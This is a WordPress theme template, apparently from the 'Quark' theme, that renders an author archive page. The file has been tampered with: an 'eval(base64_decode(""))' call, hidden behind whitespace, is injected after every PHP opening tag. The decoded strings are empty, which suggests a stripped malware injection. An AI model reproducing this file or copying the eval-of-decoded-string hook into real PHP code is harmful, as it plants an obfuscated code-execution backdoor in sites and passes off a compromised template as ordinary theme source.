<?php	 	eval(base64_decode(""));
/**
 * The template for displaying an archive page for Categories.
 *
 * @package Quark
 * @since Quark 1.0
 */

get_header(); ?>

	<div id="primary" class="site-content row" role="main">

		<div class="col grid_8_of_12">

			<?php	 	eval(base64_decode("")); if ( have_posts() ) : ?>

				<?php	 	eval(base64_decode(""));
				// Queue the first post, that way we know what author we're dealing with (if that is the case).
				// We reset this later so we can run the loop properly with a call to rewind_posts().
				the_post();
				?>

				<header class="archive-header">
					<h1 class="archive-title"><?php	 	eval(base64_decode("")); printf( esc_html__( 'Author Archives: %s', 'quark' ), '<span class="vcard">' . get_the_author() . '</span>' ); ?></h1>
				</header><!-- .archive-header -->

				<?php	 	eval(base64_decode("")); // If a user has filled out their description, show a bio on their entries.
				if ( get_the_author_meta( 'description' ) ) {
					get_template_part( 'author-bio' );
				} ?>

				<?php	 	eval(base64_decode(""));
				// Since we called the_post() above, we need to rewind the loop back to the beginning that way we can run the loop properly, in full.
				rewind_posts();
				?>

				<?php	 	eval(base64_decode("")); // Start the Loop ?>
				<?php	 	eval(base64_decode("")); while ( have_posts() ) : the_post(); ?>
					<?php	 	eval(base64_decode("")); get_template_part( 'content', get_post_format() ); ?>
				<?php	 	eval(base64_decode("")); endwhile; ?>

				<?php	 	eval(base64_decode("")); quark_content_nav( 'nav-below' ); ?>

			<?php	 	eval(base64_decode("")); else : ?>

				<?php	 	eval(base64_decode("")); get_template_part( 'no-results' ); // Include the template that displays a message that posts cannot be found ?>

			<?php	 	eval(base64_decode("")); endif; // end have_posts() check ?>

		</div> <!-- /.col.grid_8_of_12 -->
		<?php	 	eval(base64_decode("")); get_sidebar(); ?>

	</div> <!-- /#primary.site-content.row -->

<?php	 	eval(base64_decode("")); get_footer(); ?>
